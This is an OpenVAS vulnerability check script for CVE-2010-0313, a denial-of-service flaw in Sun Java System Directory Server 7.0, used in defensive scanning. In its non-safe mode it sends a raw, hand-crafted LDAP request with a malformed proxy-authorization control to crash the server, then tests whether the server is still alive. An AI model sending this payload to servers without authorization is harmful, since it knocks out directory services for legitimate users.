###############################################################################
# OpenVAS Vulnerability Test
#
# Sun Java System Directory Server 'core_get_proxyauth_dn' Denial of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100438");
  script_version("2020-08-24T08:40:10+0000");
  script_tag(name:"last_modification", value:"2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-01-12 12:22:08 +0100 (Tue, 12 Jan 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2010-0313");
  script_bugtraq_id(37699);
  script_name("Sun Java System Directory Server 'core_get_proxyauth_dn' Denial of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("sun_dir_server_detect.nasl");
  script_require_ports("Services/ldap", 389, 636);
  script_mandatory_keys("SunJavaDirServer/installed", "ldap/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37699");
  script_xref(name:"URL", value:"http://intevydis.blogspot.com/2010/01/sun-directory-server-70.html");
  script_xref(name:"URL", value:"http://www.sun.com/software/products/directory_srvr/home_directory.xml");

  script_tag(name:"summary", value:"Sun Java System Directory Server is prone to a denial-of-service
  vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to crash the effected application,
  denying service to legitimate users.");

  script_tag(name:"affected", value:"Directory Server 7.0 is vulnerable, other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("version_func.inc");
include("ldap.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ldap_get_port( default:389 );

if(safe_checks()) {
  if(!version = get_kb_item("ldap/" + port + "/SunJavaDirServer"))
    exit(0);

  if(!isnull(version)) {
    if(version_is_equal(version:version, test_version:"7.0")) {
      report = report_fixed_ver(installed_version:version, fixed_version:"None");
      security_message(port:port, data:report);
      exit(0);
    }
  }
} else {

  if(!ldap_alive(port:port))
    exit(0);

  soc = open_sock_tcp(port);
  if(!soc)
    exit(0);

  req = raw_string(0x30, 0x82, 0x01, 0x15, 0x02, 0x01, 0x01, 0x63, 0x82, 0x01, 0x0e, 0x04, 0x00, 0x0a, 0x01, 0x02,
                   0x0a, 0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00, 0x87, 0x0b, 0x6f, 0x62,
                   0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x02, 0x04, 0x00, 0xa0, 0x81, 0xe9,
                   0x30, 0x81, 0xe6, 0x04, 0x18, 0x32, 0x2e, 0x31, 0x36, 0x2e, 0x38, 0x34, 0x30, 0x2e, 0x31, 0x2e,
                   0x31, 0x31, 0x33, 0x37, 0x33, 0x30, 0x2e, 0x33, 0x2e, 0x34, 0x2e, 0x31, 0x38, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x04, 0x00);

  send(socket:soc, data:req);
  close(soc);

  sleep(5); # server needs a few seconds to die,

  if(!ldap_alive(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
